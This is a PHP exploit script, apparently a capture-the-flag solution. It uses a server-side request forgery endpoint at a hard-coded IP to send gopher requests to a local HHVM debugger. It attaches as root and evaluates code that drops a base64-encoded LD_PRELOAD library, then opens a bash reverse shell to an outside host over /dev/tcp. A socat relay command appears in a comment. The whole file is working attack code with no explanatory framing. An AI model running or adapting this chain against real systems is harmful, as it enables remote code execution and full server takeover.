<?php

function req ($a) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'http://124.71.132.232:58080/?url=' . urlencode('gopher://127.0.0.1:8999/_' . urlencode($a)));
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  $output = curl_exec($ch);
  var_dump(curl_error($ch));
  curl_close($ch);
}

$sandbox = '/var/www/html/sandbox/1b5337d0c8ad813197b506146d8d503d/a.so';
req('{"command":"attach","arguments":{"name":"Attach","type":"hhvm","request":"attach","host":"localhost","port":8999,"remoteSiteRoot":"/","localWorkspaceRoot":"/","__configurationTarget":5,"__sessionId":"","sandboxUser":"root"},"type":"request","seq":1}' . "\0" . '{"command":"evaluate","arguments":{"expression":"file_put_contents(\'' . $sandbox . '\',base64_decode(\'' . base64_encode(file_get_contents('./ldpreload/a.so')) . '\'));eval(base64_decode(\'' . base64_encode('function aa(){$ch=1;proc_open(\'\',dict[],inout $ch,\'\',dict[\'LD_PRELOAD\'=>\'' . $sandbox . '\',\'COMMAND\'=>\'bash -c \\\'bash -i >& /dev/tcp/xss.zsxsoft.com/23460 0>&1\\\'\']);}') . '\'));aa();","context":"repl"},"type":"request","seq":2}' . "\0");

// socat -v tcp-listen:9999,reuseaddr,fork tcp-connect:127.0.0.1:8999
